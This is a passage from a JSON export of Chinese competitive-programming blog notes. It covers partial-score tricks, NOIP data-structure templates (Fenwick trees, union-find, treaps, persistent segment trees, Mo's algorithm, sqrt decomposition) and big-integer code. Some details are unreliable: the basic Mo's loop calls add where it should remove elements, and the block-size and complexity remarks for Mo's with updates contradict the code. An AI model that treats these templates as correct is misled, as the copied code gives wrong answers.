read(){\n\tint res=0,ch=getchar(),f=1;\n\twhile(!isdigit(ch) and ch!=EOF){\n\t\tif(ch=='-') f=-1;\n\t\tch=getchar();\n\t}\n\twhile(isdigit(ch)){\n\t\tres=(res<<3)+(res<<1)+(ch-'0');\n\t\tch=getchar();\n\t}\n\treturn res*f;\n}\n\nstruct Edge{int next,to;} edge[_];\nint out[_],head[_],size,ans;\ninline void adde(int u,int v){edge[++size].to=v,edge[size].next=head[u],head[u]=size;}\nset<int> tag[_];\ninline void del(int u,int v){\n\tif(tag[v].count(u)) return;\n\ttag[v].insert(u);\n\tint flag1=out[u];\n\tout[u]--;\n\tint flag2=out[u];\n\tif(flag1==1&&flag2!=1) ans--;\n\tif(flag1!=1&&flag2==1) ans++;\n\n}\ninline void add(int u,int v){\n\tif(tag[v].count(u)==0) return;\n\ttag[v].erase(u);\n\tint flag1=out[u];\n\tout[u]++;\n\tint flag2=out[u];\n\tif(flag1==1&&flag2!=1) ans--;\n\tif(flag1!=1&&flag2==1) ans++;\n}\n\nsigned main(){\n\tfreopen(\"galaxy.in\",\"r\",stdin);\n\tfreopen(\"galaxy.out\",\"w\",stdout);\n\tint n=read(),m=read();\n\tfor(int i=1;i<=m;i++){\n\t\tint u=read(),v=read();\n\t\tout[u]++;\n\t\tadde(v,u);\n\t}\n\tfor(int i=1;i<=n;i++) if(out[i]==1) ans++;\n\tint q=read();\n\twhile(q--){\n\t\tif((double)clock()/CLOCKS_PER_SEC>1.9){\n\t\t\tprintf(\"NO\\n\");\n\t\t\tbreak;\n\t\t}\n\t\tint t=read(),u,v;\n\t\tif(t==1||t==3) u=read(),v=read();\n\t\tif(t==2||t==4) u=read();\n\t\tif(t==1){\n\t\t\tdel(u,v);\n\t\t}else if(t==2){\n\t\t\tfor(int i=head[u];i;i=edge[i].next){\n\t\t\t\tdel(edge[i].to,u);\n\t\t\t}\n\t\t}else if(t==3){\n\t\t\tadd(u,v);\n\t\t}else{\n\t\t\tfor(int i=head[u];i;i=edge[i].next){\n\t\t\t\tadd(edge[i].to,u);\n\t\t\t}\n\t\t}\n\t\tif(ans==n) cout<<\"YES\"<<endl;\n\t\telse cout<<\"NO\"<<endl;\n\t}\n\t//注意这里\n\twhile(q>0){\n\t\tprintf(\"NO\\n\");\n\t\tq--;\n\t}\n\treturn 0;\n}\n```\n\n## 贪心\n\n我们这里并不用贪心算法去想正解，而是灵活运用贪心的思想来骗分\n\n**例1: [USACO18OPEN] Talent Show G**\n\n首先我们考虑一个贪心，可能不一定正确。我们把每个牛的才艺与重量的比值从大到小进行排序。一个直观的想法是选择性价比高的牛可能会更好一些。然后我们dfs爆搜。  \n这里有个做法，就是当遍历到第i个牛时，不去立即选择第i+1个牛，而是向后枚举接下来要选择的牛。\n\n```cpp\n#include<bits/stdc++.h>\n#define _ 500\nusing namespace std;\n\nint n,w;\ntypedef pair<int,int> pii;\npii e[_];\n\nint ans,cnt=0;\nvoid dfs(int x,int nowt,int noww){\n\tcnt++;\n\tif(cnt>100000000) return;\n\tif(noww>=w) ans=max(ans,nowt*1000/noww);\n\tfor(int i=x+1;i<=n;i++) dfs(i,nowt+e[i].first,noww+e[i].second);\n}\n\nint main(){\n\tios::sync_with_stdio(false);\n\tcin>>n>>w;\n\tfor(int i=1;i<=n;i++) cin>>e[i].second>>e[i].first;\n\tsort(e+1,e+n+1,[](pii x,pii y){return x.first*y.second>y.first*x.second;});\n\tfor(int i=1;i<=n;i++) dfs(i,e[i].first,e[i].second);\n\tcout<<ans;\n\treturn 0;\n}\n```\n\n结合卡时，上述的代码就可以得到50 pts。\n\n然后我们接下来考虑，因为我们是按照性价比从高到低的顺序选择，如果选择的牛的重量已经满足要求，接下来再去选择，大概率是不会让答案更优的，所以我们将上述代码中的\n\n```cpp\nif(noww>=w) ans=max(ans,nowt*1000/noww);\n```\n\n改为\n\n```cpp\nif(noww>=w) return ans=max(ans,nowt*1000/noww),void();\n```\n\n就可以直接ac\n当然这一步风险还是有的\n\n","summary":"noip提高级范围内的数据结构知识点和模板，自用。","key":["noip","骗分","技巧"],"tags":[],"path":["算法竞赛","浅谈信息学竞赛中的骗分技巧.md"],"background":"https://pic.caiwen.work/i/2025/01/22/67909e51b8f1c.jpg","recommend":false,"status":"draft"},{"type":"Article","title":"数据结构","id":"noip-ds","createTime":"2023-02-03T08:41:00.000Z","updateTime":"2025-09-05T13:34:05.660Z","content":"\n## 树状数组\n\n### 普通树状数组\n\n单点加操作\n\n```cpp\nint n,arr[500005];\ninline int lowbit(int x){return x&-x;}\ninline void add(int x,int d){\n\twhile(x<=n){\n\t\tarr[x]+=d;\n\t\tx+=lowbit(x);\n\t}\n}\n```\n\n前缀和操作\n\n```cpp\ninline int sum(int x){\n\tint res=0;\n\twhile(x){\n\t\tres+=arr[x];\n\t\tx-=lowbit(x);\n\t}\n\treturn res;\n}\n```\n\n### 差分树状数组\n\n将树状数组维护差分数组，就可以达到**区间加**和**单点查询**操作\n\n### 多维树状数组\n\n使用for来循环，其他的和普通树状数组类似\n\n```cpp\nint n,m,arr[102][102];\ninline int lowbit(int x){return x&-x;}\ninline void add(int x,int y,int d){\n\tfor(int i=x;i<=n;i+=lowbit(i)){\n\t\tfor(int j=y;j<=m;j+=lowbit(j)) arr[i][j]+=d;\n\t}\n}\ninline int sum(int x,int y){\n\tint res=0;\n\tfor(int i=x;i;i-=lowbit(i)){\n\t\tfor(int j=y;j;j-=lowbit(j)) res+=arr[i][j];\n\t}\n\treturn res;\n}\n```\n\n### 区间查询/修改树状数组\n\n需要维护两个数组：$d$ 和 $di$  \n为了简便，add和sum操作都需要第一个参数传递要操作的数组\n\n```cpp\nint a[100005],d[100005],di[100005];\nint n;\ninline int lowbit(int x){return -x&x;}\ninline void add(int *arr,int x,int d){\n\t while(x<=n){\n\t \tarr[x]+=d;\n\t \tx+=lowbit(x);\n\t }\n}\ninline int sum(int *arr,int x){\n\tint res=0;\n\twhile(x){\n\t\tres+=arr[x];\n\t\tx-=lowbit(x);\n\t}\n\treturn res;\n}\n```\n\n$a[]$ 为初始数据  \n$d[]$ 为差分数组，即$d[i]=a[i]-a[i-1]$  \n$di[i]=i*d[i]$\n我们有公式  \n$$\\sum_{i=1}^{n} a_i =(n+1)\\times \\sum_{i=1}^{n} d[i]-\\sum_{i=1}^{n} di[i]$$  \n初始化\n\n```cpp\nfor(int i=1;i<=n;i++){\n\ta[i]=read();\n\tint tmp=a[i]-a[i-1];\n\tadd(d,i,tmp);\n\tadd(di,i,tmp*i);\n}\n```\n\nadd操作\n\n```cpp\n//在区间[l,r]中都加上v\nadd(d,l,v);add(d,r+1,-v);\nadd(di,l,l*v);add(di,r+1,-(r+1)*v);\n```\n\n区间查询直接套上面的公式即可\n\n## 并查集\n\n### 普通并查集\n\n```cpp\nint fa[10004];\ninline int find(int x){\n\twhile(x!=fa[x]) x=fa[x]=fa[fa[x]];\n\treturn x;\n}\n\n//初始化\nfor(int i=1;i<=n;i++) fa[i]=i;\n```\n\n### 带权并查集\n\n**[NOI2002] 银河英雄传说**\n\n**题目描述**\n\n杨威利擅长排兵布阵，巧妙运用各种战术屡次以少胜多，难免恣生骄气。在这次决战中，他将巴米利恩星域战场划分成 $30000$ 列，每列依次编号为 $1, 2,\\ldots ,30000$。之后，他把自己的战舰也依次编号为 $1, 2, \\ldots , 30000$，让第 $i$ 号战舰处于第 $i$ 列。\n\n合并指令为 `M i j`，含义为第 $i$ 号战舰所在的整个战舰队列，作为一个整体（头在前尾在后）接至第 $j$ 号战舰所在的战舰队列的尾部。\n\n询问指令：`C i j`。该指令意思是，询问第 $i$ 号战舰与第 $j$ 号战舰当前是否在同一列中，如果在同一列中，那么它们之间布置有多少战舰。\n\n作为一个资深的高级程序设计员，你被要求编写程序分析杨威利的指令，以及回答莱因哈特的询问。\n\n带权并查集需要在并查集合并和路径压缩时维护权值信息。下面是维护元素到根节点距离的实例（实际上还要顺便维护并查集连通块大小）\n\n带权并查集就需要使用递归式了\n\n```cpp\nint fa[30001];\nint w[30001];\nint size[30001];\nint find(int x){\n\tif(fa[x]==x) return x;\n\tint k=fa[x];//备份\n\tfa[x]=find(fa[x]);//路径压缩\n\tw[x]+=w[k];//更新，自己原来的父节点不一定是根节点，原来的值可能是假的，需要更新\n\tsize[x]=size[fa[x]];//更新\n\treturn fa[x];\n}\n\n//将a合并到b\ninline void unionn(int a,int b){\n\ta=find(a);\n\tb=find(b);\n\tfa[a]=b;\n\tw[a]+=size[b];//这里揭示了为什么还要维护并查集连通块大小\n\tsize[a]+=size[b];\n\tsize[b]=size[a];\n}\n```\n\n### 种类并查集\n\n种类并查集可以非常好地处理元素之间的关系。\n\n使用种类并查集的前提是，关系中的不等号**具有传递性**，比如满足类似\"a!=b,b!=c则必有a!=c\"的关系。更形象的话就是“非黑即白”\n\n如果不具有传递性，可以考虑将并查集的处理离线下来操作，详见P1955\n\n### 并查集快速跳过\n\n在一个数列上，让每个点都指向另一个点（可以是自身也可以是后面的点），遍历到这个点之后就直接跳到指向的点，就可以达到快速跳过的目的。使用路径压缩会提高效率。其中的实现就是使用并查集\n\n## 单调队列\n\n这里以单调递增队列为例\n\npush操作\n\n```cpp\nstruct Entry{\n\tint val,pos;\n};\ndeque<Entry> q;\nvoid push(Entry x){\n\twhile(!q.empty()&&q.back().val>x.val) q.pop_back();\n\tq.push_back(x);\n}\n```\n\n将元素放入双端队列前要维持单调队列的单调性\ni为当前遍历到的位置，k为队列长度\n\n```cpp\nwhile(!q.empty()&&q.front().pos<=i-k) q.pop_front();\n```\n\n取队头元素时要判断是否过期\n\n## st表\n\n取log\n\n```cpp\nint a[maxn],lg[maxn],st[maxn][20];\nfor(int i=2;i<=n;i++) lg[i]=lg[i>>1]+1;\n```\n\n预处理\n\n```cpp\nfor(int i=1;i<=n;i++) st[i][0]=a[i];\nfor(int i=1;i<=lg[n];i++){//枚举长度\n\tfor(int j=1;j<=n-(1<<i)+1;j++){//枚举起点\n\t\tst[j][i]=max(st[j][i-1],st[j+(1<<(i-1))][i-1]);\n\t}\n}\n```\n\n查询\n\n```cpp\n//求[l,r]之间的最大值\nint k=lg[r-l+1];\nint ans=max(st[l][k],st[r-(1<<k)+1][k]);\n```\n\n## FHQ Treap\n\n### 维护值域\n\n```cpp\nint ch[_][2],val[_],dat[_],size[_],tot;\ninline void update(int x){size[x]=1+size[ch[x][0]]+size[ch[x][1]];}\ninline int create(int v){return size[++tot]=1,val[tot]=v,dat[tot]=rand(),tot;}\n//fhq treap满足小根堆\nint merge(int x,int y){\n\tif(!x||!y) return x+y;\n\tif(dat[x]<dat[y]) return ch[x][1]=merge(ch[x][1],y),update(x),x;\n\telse return ch[y][0]=merge(x,ch[y][0]),update(y),y;\n}\nvoid split(int now,int k,int &x,int &y){\n\tif(!now) return x=y=0,void();\n\tif(val[now]<=k) x=now,split(ch[now][1],k,ch[now][1],y);\n\telse y=now,split(ch[now][0],k,x,ch[now][0]);\n\tupdate(now);\n}\nint query(int now,int k){\n\twhile(true){\n\t\tif(k<=size[ch[now][0]]) now=ch[now][0];\n\t\telse if(k==size[ch[now][0]]+1) return now;\n\t\telse k-=size[ch[now][0]]+1,now=ch[now][1];\n\t}\n}\n```\n\n**插入**  \n`split(root,x,l,r),root=merge(merge(l,create(x)),r);`\n\n**删除**  \n`split(root,x,l,tmp),split(l,x-1,l,r),r=merge(ch[r][0],ch[r][1]),root=merge(merge(l,r),tmp);`\n\n**rank**  \n`split(root,x-1,l,r),cout<<size[l]+1<<endl,root=merge(l,r);`\n\n**kth**  \n`cout<<val[query(root,x)]<<endl;`\n\n**前驱**  \n`split(root,x-1,l,r),cout<<val[query(l,size[l])]<<endl,root=merge(l,r);`\n\n**后继**  \n`split(root,x,l,r),cout<<val[query(r,1)]<<endl,root=merge(l,r);`\n\n### 维护序列\n\n事实上，在维护值域的时候，实际上就是在维护一个排好序的序列\n\n在维护序列时，只需要改动一下split操作即可\n\n**[CZOI Online #2] 滚动**\n\n我们规定将序列向左滚动表示：第二个数变为第一个数，第三个数变为第二个数...第一个数变为最后一个数。\n\n现给定一个长度为 $n$ 的序列。我们有 $m$ 个操作，每次操作给定一个数 $x$，表示查询序列中位置 $x$ 上的数，然后再将区间 $[x,n]$ 向左滚动。\n\n你需要回答每次的查询。\n\n```cpp\n#include<bits/stdc++.h>\n#define int long long\n#define _ 2000006\nusing namespace std;\n\nint n,m;\nint ch[_][2],dat[_],size[_],tot;\nlong long val[_];\ninline void update(int x){size[x]=1+size[ch[x][0]]+size[ch[x][1]];}\ninline int create(long long v){return size[++tot]=1,val[tot]=v,dat[tot]=rand(),tot;}\nint merge(int x,int y){\n\tif(!x||!y) return x+y;\n\tif(dat[x]<dat[y]) return ch[x][1]=merge(ch[x][1],y),update(x),x;\n\telse return ch[y][0]=merge(x,ch[y][0]),update(y),y;\n}\nvoid split(int now,int k,int &x,int &y){\n\tif(!now) return x=y=0,void();\n\tint u=size[ch[now][0]]+1;//注意这里！！！！！！！！！！！！！！\n\tif(u<=k) x=now,split(ch[now][1],k-u,ch[now][1],y);\n\telse y=now,split(ch[now][0],k,x,ch[now][0]);\n\tupdate(now);\n}\nint query(int now,int k){\n\twhile(true){\n\t\tif(k<=size[ch[now][0]]) now=ch[now][0];\n\t\telse if(k==size[ch[now][0]]+1) return now;\n\t\telse k-=size[ch[now][0]]+1,now=ch[now][1];\n\t}\n}\n\nsigned main(){\n\tios::sync_with_stdio(false);\n\tcin.tie(0);\n\tcin>>n>>m;\n\tint root=0;\n\tfor(int i=1;i<=n;i++){\n\t\tint x;cin>>x;\n\t\troot=merge(root,create(x));\n\t}\n\tfor(int i=1;i<=m;i++){\n\t\tint x;cin>>x;\n\t\tlong long ans=val[query(root,x)];\n\t\tcout<<ans<<'\\n';\n\t\tint p1=0,p2=0,p3=0,p4=0;\n\t\tsplit(root,x-1,p1,p2);\n\t\tsplit(p2,1,p3,p4);\n\t\troot=merge(merge(p1,p4),create(ans));\n\t}\n\treturn 0;\n}\n```\n\n（原题数据比较毒瘤（虽然是自己出的），必须要开long long才能过）\n\n**P3391 【模板】文艺平衡树**\n\n您需要写一种数据结构（可参考题目标题），来维护一个有序数列。\n\n其中需要提供以下操作：翻转一个区间，例如原有序序列是 $5\\ 4\\ 3\\ 2\\ 1$，翻转区间是 $[2,4]$ 的话，结果是 $5\\ 2\\ 3\\ 4\\ 1$。\n\n```cpp\n#include<iostream>\n#define maxn 100005\nusing namespace std;\n\nint id,val[maxn],dat[maxn],size[maxn],ch[maxn][2],root,tag[maxn];\ninline int create(int x){\n\tid++;\n\tval[id]=x;\n\tdat[id]=rand();\n\tsize[id]=1;\n\treturn id;\n}\ninline void pushup(int k){\n\tsize[k]=size[ch[k][0]]+1+size[ch[k][1]];\n}\ninline void pushdown(int k){\n\tif(tag[k]){\n\t\ttag[ch[k][0]]^=1;\n\t\ttag[ch[k][1]]^=1;\n\t\tswap(ch[k][0],ch[k][1]);\n\t\ttag[k]=0;\n\t}\n}\nvoid split(int now,int k,int &x,int &y){\n\tif(!now) x=y=0;\n\telse{\n\t\tpushdown(now);\n\t\tint u=size[ch[now][0]]+1;\n\t\tif(u<=k){\n\t\t\tx=now;\n\t\t\tsplit(ch[now][1],k-u,ch[now][1],y);\n\t\t\tpushup(x);\n\t\t}else{\n\t\t\ty=now;\n\t\t\tsplit(ch[now][0],k,x,ch[now][0]);\n\t\t\tpushup(y);\n\t\t}\n\t}\n}\nint merge(int x,int y){\n\tif(!x||!y) return x+y;\n\tpushdown(x);\n\tpushdown(y);\n\tif(dat[x]<=dat[y]){\n\t\tch[x][1]=merge(ch[x][1],y);\n\t\tpushup(x);\n\t\treturn x;\n\t}else{\n\t\tch[y][0]=merge(x,ch[y][0]);\n\t\tpushup(y);\n\t\treturn y;\n\t}\n}\nvoid reverse(int l,int r){\n\tint p1=0,p2=0,p3=0,p4=0;\n\tsplit(root,l-1,p1,p2);\n\tsplit(p2,(r-l+1),p3,p4);\n\ttag[p3]^=1;\n\tp2=merge(p3,p4);\n\troot=merge(p1,p2);\n}\nvoid print(int k){\n\tpushdown(k);\n\tif(ch[k][0]) print(ch[k][0]);\n\tcout<<val[k]<<\" \";\n\tif(ch[k][1]) print(ch[k][1]);\n}\n\nint main(){\n\tint n,m;\n\tcin>>n>>m;\n\tint l,r;\n\tfor(int i=1;i<=n;i++){\n\t\t//int k;\n\t\t//cin>>k;\n\t\tsplit(root,i-1,l,r);\n\t\troot=merge(merge(l,create(i)),r);\n\t}\n\twhile(m--){\n\t\tcin>>l>>r;\n\t\treverse(l,r);\n\t}\n\tprint(root);\n\treturn 0;\n}\n```\n\n可以直接把要翻转的区间分割出来打上懒标记\n值得注意的是，merge和split操作时都需要把懒标记pushdown\n\n## 主席树\n\n```cpp\nint in[_],din[_];\nint root[_],size;\nstruct Node{int l,r,val;}tree[_<<5];//开32倍大小\ninline int clone(int node){return tree[++size]=tree[node],size;}\nint build(int l,int r){\n\tint node=++size;\n\tif(l==r) return node;\n\tint mid=(l+r)>>1;\n\ttree[node].l=build(l,mid);\n\ttree[node].r=build(mid+1,r);\n\treturn node;\n}\n\nint update(int pre,int l,int r,int x){\n\tint node=clone(pre);\n\ttree[node].val++;\n\tif(l==r) return node;\n\tint mid=(l+r)>>1;\n\tif(x<=mid) tree[node].l=update(tree[node].l,l,mid,x);\n\telse tree[node].r=update(tree[node].r,mid+1,r,x);\n\treturn node;\n}\n\nint query(int u,int v,int l,int r,int k){\n\tif(l==r) return din[l];\n\tint mid=(l+r)>>1;\n\tint num=tree[tree[v].l].val-tree[tree[u].l].val;\n\tif(num>=k) return query(tree[u].l,tree[v].l,l,mid,k);\n\telse return query(tree[u].r,tree[v].r,mid+1,r,k-num);\n}\n\nint main(){\n\tint n=read(),m=read();\n\tfor(int i=1;i<=n;i++) in[i]=din[i]=read();\n\troot[0]=build(1,n);\n\n\tsort(din+1,din+1+n);\n\tint len=unique(din+1,din+n+1)-din-1;\n\tfor(int i=1;i<=n;i++){\n\t\tint x=lower_bound(din+1,din+len+1,in[i])-din;\n\t\troot[i]=update(root[i-1],1,n,x);\n\t}\n\twhile(m--){\n\t\tint l=read(),r=read(),k=read();\n\t\tcout<<query(root[l-1],root[r],1,n,k)<<endl;\n\t}\n\treturn 0;\n}\n```\n\n## 莫队\n\n### 普通莫队\n\n以询问区间内有多少个不同的数为例\n\n```cpp\nint n,in[1000010],bl[1000010],blo,ans[1000010];\nstruct Query{int l,r,id;} q[1000010];\n\n//按左端点所在的块的位置排序。相同再按照右端点的位置排序\ninline bool cmp1(Query a,Query b){return bl[a.l]==bl[b.l]? a.r<b.r:bl[a.l]<bl[b.l];}\ninline bool cmp2(Query a,Query b){return a.id<b.id;}\n\nint l=1,r,now,cnt[1000010];\n//加入\ninline void add(int x){\n\tif(cnt[in[x]]==0) ++now;\n\t++cnt[in[x]];\n}\n//删除\ninline void del(int x){\n\t--cnt[in[x]];\n\tif(cnt[in[x]]==0) --now;\n}\n\nint main(){\n\tcin>>n;\n\tblo=sqrt(n);\n\tfor(int i=1;i<=n;i++) cin>>in[i];\n\tfor(int i=1;i<=n;i++) bl[i]=(i-1)/blo+1;\n\n\tint m;cin>>m;\n\tfor(int i=1;i<=m;i++) cin>>q[i].l>>q[i].r,q[i].id=i;\n\n\tsort(q+1,q+m+1,cmp1);\n\tfor(int i=1;i<=m;i++){\n\t\t//注意删除操作是先删除，再移动指针\n\t\t//添加操作是先移动指针再添加\n\t\twhile(l<q[i].l) del(l++);\n\t\twhile(l>q[i].l) add(--l);\n\t\twhile(r<q[i].r) add(++r);\n\t\twhile(r>q[i].r) add(r--);\n\t\tans[q[i].id]=now;\n\t}\n\tsort(q+1,q+m+1,cmp2);\n\tfor(int i=1;i<=m;i++) cout<<ans[i]<<endl;\n\treturn 0;\n}\n```\n\n### 带修莫队\n\n- 可修改莫队只用于单点修改，区间修改的题目就算了吧...\n\n- 时间上的优化：将块的大小从sqrt(n)改为n的二分之三次方，即 `blo=pow(n,0.666);`  \n  复杂度大约为O(n的五分之三次方)\n\n修改和询问单独分开\n\n```cpp\nint numq,numc;\nstruct Query{int l,r,pre,id,ans;} q[maxn];\nstruct Change{int pos,val;} c[maxn];\n\n//排序部分，右端点比较对象改变，新增了一个比较的关键字\ninline bool cmp1(Query a,Query b){\n\tif(bl[a.l]!=bl[b.l]) return bl[a.l]<bl[b.l];\n\tif(bl[a.r]!=bl[b.r]) return bl[a.r]<bl[b.r];\n\treturn a.pre<b.pre;\n}\n\n//读入部分\nfor(int i=1;i<=m;i++){\n\tchar opt;\n\tcin>>opt;\n\tif(opt=='Q'){\n\t\tnumq++;\n\t\tq[numq].l=read();q[numq].r=read();\n\t\tq[numq].pre=numc;\n\t\tq[numq].id=numq;\n\t}\n\tif(opt=='R'){\n\t\tnumc++;\n\t\tc[numc].pos=read();c[numc].val=read();\n\t}\n}\n```\n\n新增 `now` 变量，表示当前处理了几个修改操作  \n移动指针后需要顺手处理一下操作\n\n```cpp\nfor(int i=1;i<=numq;i++){\n\twhile(l<q[i].l) del(l++);\n\twhile(l>q[i].l) add(--l);\n\twhile(r<q[i].r) add(++r);\n\twhile(r>q[i].r) del(r--);\n\t//带修莫队\n\twhile(now<q[i].pre) work(++now,i);\n\twhile(now>q[i].pre) work(now--,i);\n\tq[i].ans=ans;\n}\n\n//不去真正执行这个操作，把数据修改。而是考虑操作对答案的贡献\ninline void work(int x,int i){\n\tif(c[x].pos>=q[i].l&&c[x].pos<=q[i].r){//只有修改在查询区间内才会对ans产生影响\n\t\tcnt[in[c[x].pos]]--;\n\t\tif(cnt[in[c[x].pos]]==0) ans--;\n\t\tcnt[c[x].val]++;\n\t\tif(cnt[c[x].val]==1) ans++;\n\t}\n\t//下次再修改就相当于撤销了本次修改\n\tswap(c[x].val,in[c[x].pos]);\n}\n```\n\n## 分块\n\n块长度 `blo=sqrt(n)`\n\n每个元素属于第几个块 `bl=(i-1)/blo+1`\n\n并且有一个性质，第 $i$ 个块的右边界为 $i*blo$\n\n一般分块的做法为\n\n```cpp\nfor(int i=l;i<=min(bl[l]*blo,r);i++) ...//对左侧的非整块进行暴力操作\nif(bl[l]!=bl[r])\n\tfor(int i=(bl[r]-1)*blo+1;i<=r;i++) ...//对右侧的非整块进行暴力操作\nfor(int i=bl[l]+1;i<=bl[r]-1;i++) ...//对中间的整块进行操作\n```\n\n### 区间小于某个值\n\n区间加，然后查找区间第k小\n\n在块内进行二分查找，多加一个log的复杂度。对于非整块的数据，可以进行一个reset操作，即暴力对非整块进行加法操作，然后再重新对这个块的元素排序\n\n```cpp\ninline void reset(int x){\n\tv[x].clear();\n\tfor(int i=(x-1)*blo+1;i<=min(x*blo,n);i++) v[x].push_back(in[i]);\n\tsort(v[x].begin(),v[x].end());\n}\n\ninline void add(int l,int r,int c){\n\tfor(int i=l;i<=min(bl[l]*blo,r);i++) in[i]+=c;\n\treset(bl[l]);\n\tif(bl[l]!=bl[r]){\n\t\tfor(int i=(bl[r]-1)*blo+1;i<=r;i++) in[i]+=c;\n\t\treset(bl[r]);\n\t}\n\tfor(int i=bl[l]+1;i<=bl[r]-1;i++) tag[i]+=c;\n}\n\ninline int query(int l,int r,int c){\n\tint ans=0;\n\tfor(int i=l;i<=min(bl[l]*blo,r);i++) if(in[i]+tag[bl[i]]<c) ans++;\n\tif(bl[l]!=bl[r]){\n\t\tfor(int i=(bl[r]-1)*blo+1;i<=r;i++) if(in[i]+tag[bl[i]]<c) ans++;\n\t}\n\tfor(int i=bl[l]+1;i<=bl[r]-1;i++){\n\t\tint x=c-tag[i];\n\t\tans+=lower_bound(v[i].begin(),v[i].end(),x)-v[i].begin();\n\t}\n\treturn ans;\n}\n```\n\n### 插入\n\n分块支持插入，使用vector维护。但会破坏块的大小，需要在若干次操作后对块进行重构。\n\n```cpp\npair<int,int> query(int a){\n\tint x=1;\n\twhile(a>v[x].size()) a-=v[x].size(),x++;\n\treturn make_pair(x,a-1);\n}\nvoid rebuild(){\n\tint top=0;\n\tfor(int i=1;i<=m;i++){\n\t\tfor(auto j:v[i]){\n\t\t\ttmp[++top]=j;//创建临时数组，把所有的数据都复制下来\n\t\t}\n\t\tv[i].clear();\n\t}\n\tblo=sqrt(top);\n\tfor(int i=1;i<=top;i++){\n\t\tbl[i]=(i-1)/blo+1;\n\t\tv[bl[i]].push_back(tmp[i]);\n\t}\n\tm=bl[n];\n}\nvoid insert(int l,int r){\n\tpair<int,int> t=query(l);\n\tv[t.first].insert(v[t.first].begin()+t.second,r);\n\tif(v[t.first].size()>20*blo) rebuild();\n}\n```\n\n## 线段树优化建图\n\n若干变量\n\n```cpp\n//线段树\n//tree out/in存放线段树节点编号所代表图中的点\n//线段树节点和图上的点一一对应\nint treeOut[maxn<<2];//out是子节点向父节点连边\nint treeIn[maxn<<2];//in是父节点向子树连边\nint cnt;//用cnt分发图中的点的编号\n//如果图中有n个节点，则cnt从n+1开始分发编号\n//前n个编号是给原图上的点保留的\n\n//线段树对图优化之后，图上最多有几个边不好计算所以直接采用邻接矩阵式\ntypedef pair<int,int> pii; //第一个int是to，第二个int是w\nvector<pii> g[maxn*10];\n```\n\n建树\n\n```cpp\nvoid build(int k,int l,int r){\n\tif(l==r){\n\t\ttreeOut[k]=l;\n\t\ttreeIn[k]=l;\n\t\treturn;\n\t}\n\tint mid=(l+r)>>1;\n\tbuild(ls(k),l,mid);\n\tbuild(rs(k),mid+1,r);\n\t//构建图基本框架\n\ttreeOut[k]=++cnt;\n\ttreeIn[k]=++cnt;\n\tg[treeOut[ls(k)]].push_back(pii(treeOut[k],0));\n\tg[treeOut[rs(k)]].push_back(pii(treeOut[k],0));\n\tg[treeIn[k]].push_back(pii(treeIn[ls(k)],0));\n\tg[treeIn[k]].push_back(pii(treeIn[rs(k)],0));\n}\n```\n\n建边\n\n```cpp\n//区间与点之间建边\n//tp=true，区间向点建边\n//tp=false，点向区间建边\ninline void connect(int k,int l,int r,int x,int y,int p,int w,bool type){\n\tif(l>=x&&r<=y){\n\t\tif(type) g[treeOut[k]].push_back(pii(p,w));\n\t\telse g[p].push_back(pii(treeIn[k],w));\n\t\treturn;\n\t}\n\tint mid=(l+r)>>1;\n\tif(x<=mid){\n\t\tconnect(ls(k),l,mid,x,y,p,w,type);\n\t}\n\tif(y>mid){\n\t\tconnect(rs(k),mid+1,r,x,y,p,w,type);\n\t}\n}\n```\n\n","summary":"noip提高级范围内的数据结构知识点和模板，自用。","key":["noip","模板","数据结构"],"tags":[{"value":"自用","color":"primary"}],"path":["算法竞赛","板子","noip","数据结构.md"],"background":"https://www.caiwen.work/wp-content/uploads/2023/02/bbb.png","recommend":false,"status":"published"},{"type":"Article","title":"其他","id":"noip-other","createTime":"2023-02-03T07:15:00.000Z","updateTime":"2025-09-05T13:34:05.614Z","content":"\n## 二维差分\n\n设$d[][]$为$a[][]$的差分数组，则有\n\n$$d[i][j]=a[i][j]-a[i-1][j]-a[i][j-1]+a[i-1][j-1]$$\n\n使用二维差分可以做到二维区间修改，单点查询，比如（借用知乎大佬的图片）：\n\n![](https://www.caiwen.work/wp-content/uploads/2022/08/QQ截图20220826145602.png)\n\n在图一所示的差分数组的地方加d，则对应原数组（图三）的区域都加d\n\n因此，在左上角$(x_1,y_1)$，右下角$(x_2,y_2)$的区域上都加上v，有：\n\n$$d[x_1][y_1]+=v$$\n\n$$d[x_2+1][y_1]-=v$$\n\n$$d[x_1][y_2+1]-=v$$\n\n$$d[x_2+1][y_2+1]+=v$$\n\n在差分数组中进行二维前缀和，就可以得到原数据\n\n## LIS\n\n$O(n log n)$ 的求LIS做法\n\n```cpp\n#include<iostream>\n#include<algorithm>\nusing namespace std;\n\nint a[1000006];\nint s[1000006],tot;//栈\n\nint main(){\n\tint n;\n\tcin>>n;\n\tfor(int i=1;i<=n;i++){\n\t\tcin>>a[i];\n\t}\n\ts[++tot]=a[1];//把第一个数入栈\n\tfor(int i=2;i<=n;i++){\n\t\tif(a[i]>s[tot]) s[++tot]=a[i];\n\t\telse{\n\t\t\tint tmp=lower_bound(s+1,s+tot+1,a[i])-s;//在栈中查找第一个大于等于a[i]的数，然后替换掉\n\t\t\ts[tmp]=a[i];\n\n\t\t}\n\t}\n\tcout<<tot;\n\treturn 0;\n}\n```\n\n## 高精度算法\n\n- string转Lint部分，没有去除前导零\n\n- 所有的加减乘除都默认是两个正整数操作，没有考虑0和负数\n\n- 比较大小的时候倒序循环！\n\n- 除法注意c.len可能为负数，需要变成0\n\n- Lint含参构造器中无法再去调用无参构造函数，需要直接把代码复制过来\n\n### 结构体\n\n```cpp\nstruct Lint{\n\tint num[maxn*2],len;char op;\n\tLint(){memset(num,0,sizeof(num));len=1;op='+';}\n\tLint(string str){memset(num,0,sizeof(num));len=1;op='+';\n\t\tif(str[0]=='-') op='-',str.erase(0,1);\n\t\tfor(int i=1;i<=str.size();i++) num[i]=(int)(str[str.size()-i])-'0';\n\t\tlen=str.size();\n\t}\n\tLint(int a,int t=0){memset(num,0,sizeof(num));len=1;op='+';\n\t\tfor(;a;len=++t,a/=10) num[t]=a%10;\n\t}\n};\n```\n\n### 大小比较\n\n```cpp\nbool operator>(Lint a,Lint b){\n\tif(a.op!=b.op) return a.op=='+';\n\tif(a.len>b.len) return a.op=='+';\n\tif(a.len<b.len) return a.op!='+';\n\tfor(int i=a.len;i>=1;i--){\n\t\tif(a.num[i]>b.num[i]) return a.op=='+';\n\t\telse if(a.num[i]<b.num[i]) return a.op!='+';\n\t}\n\treturn false;\n}\nbool operator==(Lint a,Lint b){\n\tif(a.len!=b.len) return false;\n\tfor(int i=a.len;i>=1;i--) if(a.num[i]!=b.num[i]) return false;\n\treturn true;\n}\nbool operator<(Lint a,Lint 